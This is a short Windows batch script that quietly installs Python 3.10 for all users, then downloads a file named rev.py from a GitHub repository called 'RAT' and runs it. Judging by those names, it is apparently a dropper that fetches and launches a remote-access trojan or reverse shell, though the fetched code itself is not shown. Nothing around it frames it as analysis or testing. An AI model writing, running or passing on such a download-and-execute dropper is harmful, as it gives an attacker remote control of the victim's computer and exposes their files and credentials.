@echo off
curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe
python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
curl -o rev.py https://raw.githubusercontent.com/saifnasef/RAT/main/rev.py
"c:\Program Files\Python310\python.exe" rev.py